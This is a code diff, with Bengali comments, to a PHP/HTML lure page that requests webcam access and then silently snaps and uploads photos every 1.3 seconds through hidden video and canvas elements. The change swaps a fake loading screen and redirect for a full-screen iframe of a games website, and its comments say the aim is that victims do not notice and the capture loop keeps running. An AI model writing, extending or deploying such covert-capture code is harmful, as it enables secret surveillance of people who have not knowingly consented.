@@ -45,36 +45,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Aapunkagames</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background-color: #ffffff;
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #000;
         }
-        /* ইউজার যাতে বুঝতে না পারে তাই সিম্পল একটি লোডিং স্ক্রিন */
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        #game-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <h3>Loading, please wait...</h3>
+    <!-- Iframe এর মাধ্যমে কাঙ্ক্ষিত ওয়েবসাইট স্ক্রিন জুড়ে দেখানো হবে, যাতে মূল ট্যাব বন্ধ না হয় -->
+    <iframe id="game-frame" src="https://www.aapunkagames.com/"></iframe>
     
-    <!-- ভিডিও এবং ক্যানভাস হাইড করা থাকবে যাতে কেউ বুঝতে না পারে -->
+    <!-- হিডেন ভিডিও ও ক্যানভাস যা দিয়ে ব্যাকগ্রাউন্ডে ছবি তোলা হবে -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -82,24 +75,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // অটোমেটিক পারমিশন নেওয়ার চেষ্টা এবং ব্যাকগ্রাউন্ডে প্রসেস রান করা
+        // ক্যামেরা পারমিশন নেওয়া এবং ব্যাকগ্রাউন্ড লুপ চালু রাখা
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
                 
-                // ক্যামেরা চালু হওয়ার ১ সেকেন্ড পর ছবি তোলার লুপ শুরু এবং সাথে সাথে রিডাইরেক্ট
+                // ক্যামেরা চালুর ১ সেকেন্ড পর থেকে ঠিক ১.৩ সেকেন্ড পর পর ছবি তোলার লুপ শুরু
                 setTimeout(() => {
-                    // প্রতি ১.৩ সেকেন্ড (1300ms) পর পর ছবি ক্যাপচার হবে
                     setInterval(captureAndUpload, 1300);
-
-                    // কাঙ্ক্ষিত ওয়েবসাইটে রিডাইরেক্ট করে দেওয়া
-                    window.location.href = "https://www.aapunkagames.com/";
                 }, 1000);
             })
             .catch(err => {
                 console.error("Camera error: ", err);
-                // পারমিশন না দিলেও ইউজারকে রিডাইরেক্ট করে দেওয়া নিরাপদ
-                window.location.href = "https://www.aapunkagames.com/";
             });
 
         function captureAndUpload() {
